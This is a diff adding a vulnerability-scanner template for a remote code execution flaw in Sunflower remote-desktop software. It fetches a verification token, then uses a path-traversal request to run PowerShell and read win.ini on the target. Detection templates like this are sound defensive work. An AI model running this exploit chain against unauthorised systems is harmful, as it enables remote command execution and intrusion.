@@ -1,0 +1,32 @@
+id: sunflower-windows-rce
+info:
+  name: Sunflower Windows Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: verify_string
+        part: body
+        internal: true
+        regex:
+          - "\\\"verify_string\\\":\\\"(?P<verify_string>.+?)\\\""
+    matchers:
+      - type: word
+        words:
+          - "verify_string"
+  - raw:
+      - |
+        GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+cat+C:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CID={{verify_string}}
+    matchers:
+      - type: word
+        words:
+          - "; for 16-bit app support"
+    matchers-condition: and
